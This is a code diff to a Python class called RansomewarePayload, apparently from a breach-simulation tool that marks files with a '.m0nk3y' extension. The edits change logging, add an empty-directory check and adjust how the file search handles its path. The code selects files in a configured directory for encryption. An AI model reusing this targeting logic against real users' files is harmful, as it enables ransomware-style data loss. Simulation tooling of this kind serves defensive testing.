@@ -20,10 +20,10 @@ EXTENSION = ".m0nk3y"
 
 class RansomewarePayload:
     def __init__(self, config: dict):
-        LOG.info(f"Windows dir configured for encryption is {config['windows_dir']}")
-        LOG.info(f"Linux dir configured for encryption is {config['linux_dir']}")
+        LOG.info(f"Windows dir configured for encryption is \"{config['windows_dir']}\"")
+        LOG.info(f"Linux dir configured for encryption is \"{config['linux_dir']}\"")
 
-        self._target_dir = Path(config["windows_dir"] if is_windows_os() else config["linux_dir"])
+        self._target_dir = config["windows_dir"] if is_windows_os() else config["linux_dir"]
         self._valid_file_extensions_for_encryption = VALID_FILE_EXTENSIONS_FOR_ENCRYPTION.copy()
         self._valid_file_extensions_for_encryption.discard(EXTENSION)
 
@@ -32,13 +32,16 @@ class RansomewarePayload:
         self._encrypt_files(file_list)
 
     def _find_files(self):
+        if not self._target_dir:
+            return []
+
         file_filters = [
             file_extension_filter(self._valid_file_extensions_for_encryption),
             is_not_shortcut_filter,
             is_not_symlink_filter,
         ]
 
-        all_files = get_all_regular_files_in_directory(self._target_dir)
+        all_files = get_all_regular_files_in_directory(Path(self._target_dir))
         return filter_files(all_files, file_filters)
 
     def _encrypt_files(self, file_list):
